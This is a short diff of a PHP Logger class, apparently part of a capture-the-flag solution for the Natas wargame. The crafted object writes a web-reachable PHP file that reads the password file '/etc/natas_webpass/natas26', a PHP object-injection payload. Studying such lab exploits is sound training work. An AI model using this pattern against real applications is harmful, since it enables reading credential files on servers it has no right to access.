@@ -1,6 +1,6 @@
 <?
     class Logger{
-        private $logFile = "img/password.php";
+        private $logFile = "img/passwordofnatas27.php";
         private $exitMsg = "<? echo file_get_contents('/etc/natas_webpass/natas26') ?>";
     }
 
